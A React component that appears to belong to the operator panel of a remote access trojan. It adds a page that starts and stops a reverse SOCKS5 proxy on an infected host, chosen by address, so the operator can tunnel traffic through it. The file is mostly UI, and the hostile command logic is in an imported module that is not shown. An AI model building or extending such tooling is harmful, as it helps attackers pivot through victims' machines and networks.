import { useParams } from "react-router-dom";
import { useState } from "react";
import { startReverseProxyCmd, stopReverseProxyCmd } from "../rat/RATCommands";

export const ReverseProxy = () => {
  const { addr } = useParams();
  const [port, setPort] = useState("9876");
  const [localPort, setLocalPort] = useState("2345");
  const [running, setRunning] = useState(false);

  async function start_reverse_proxy() {
    await startReverseProxyCmd(addr, port, localPort);
    setRunning(true);
  }

  async function stop_reverse_proxy() {
    await stopReverseProxyCmd(addr);
    setRunning(false);
  }

  return (
    <div className="p-6 w-full h-screen bg-primarybg box-border overflow-hidden relative text-white">
      <div className="bg-secondarybg p-5 rounded-xl shadow-inner mb-6">
        <div className="flex flex-wrap gap-4 items-center mb-4">
          <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
            <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
              Local Server Port:
            </div>
            <input
              type="text"
              className="block w-20 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 text-white"
              placeholder="3121"
              value={localPort}
              onChange={(e) => setLocalPort(e.target.value)}
            />
          </div>

          <div className="flex items-center rounded-full bg-secondarybg pl-3 border border-accentx h-9">
            <div className="shrink-0 text-base text-accentx select-none sm:text-sm/6">
              Remote Server Port:
            </div>
            <input
              type="text"
              className="block w-20 py-0 pl-2 text-base placeholder:text-gray-400 bg-transparent focus:outline-none sm:text-sm/6 text-white"
              placeholder="1080"
              value={port}
              onChange={(e) => setPort(e.target.value)}
            />
          </div>

          {!running ? (
            <button
              onClick={start_reverse_proxy}
              className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-secondarybg text-white hover:bg-white hover:text-black transition"
            >
              Start Listening
            </button>
          ) : (
            <button
              onClick={stop_reverse_proxy}
              className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-secondarybg text-white hover:bg-white hover:text-black transition"
            >
              Stop Listening
            </button>
          )}
        </div>

        <div className="text-white mt-4">
          <p>
            Connect to this SOCKS5 Proxy: 127.0.0.1:{localPort} (no user/pass)
          </p>
        </div>
      </div>
    </div>
  );
};
